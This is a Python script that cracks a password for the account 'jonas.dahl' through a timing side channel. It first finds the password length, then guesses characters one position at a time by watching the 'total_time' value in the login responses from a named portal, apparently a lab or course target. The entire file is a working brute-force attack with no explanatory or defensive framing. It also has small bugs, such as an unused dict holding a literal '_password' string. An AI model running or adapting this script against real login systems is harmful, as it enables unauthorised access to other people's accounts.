from string import ascii_lowercase
from string import ascii_uppercase
from string import digits
import requests







# Function that generates the guess passwords (brute-force technique)
def passwordCracker(currentPassword):
    characters = ascii_lowercase + ascii_uppercase + digits
    best_result = 0
    crackedPassword = currentPassword

    for i in range(len(currentPassword)):
        for letter in characters:
            candidate_password = crackedPassword[:i] + letter + currentPassword[i+1:]
            print("Testing Password", candidate_password)
            result = dummyLogin(candidate_password)
            if result.get('total_time') > 1:
                if result.get('total_time') > best_result:
                    best_result = result.get('total_time')
                    crackedPassword = candidate_password
                    break
    return crackedPassword

# Login request
def dummyLogin(password):
    # Perform a POST request
    response = requests.post("https://portal.regjeringen.uiaikt.no/login", json={'username': 'jonas.dahl', 'password': password})
    if response.status_code == 200:
        print("Request successful!")
        result = response.json()
        print("Result:", result)
        return result

def passwordAmountCracker(amount):
    guessAmount = amount
    tmpPassword = ''
    while dummyLogin(tmpPassword).get('total_time') == 0:
        print('Checking Amount', len(tmpPassword))
        for i in range(guessAmount):
            tmpPassword += ' '
    return tmpPassword

_password = passwordAmountCracker(1)
# Defining the data we want to send

data = {
    'username': 'jonas.dahl',
    'password': "_password"
}


crackedPassword = passwordCracker(_password)
print(crackedPassword)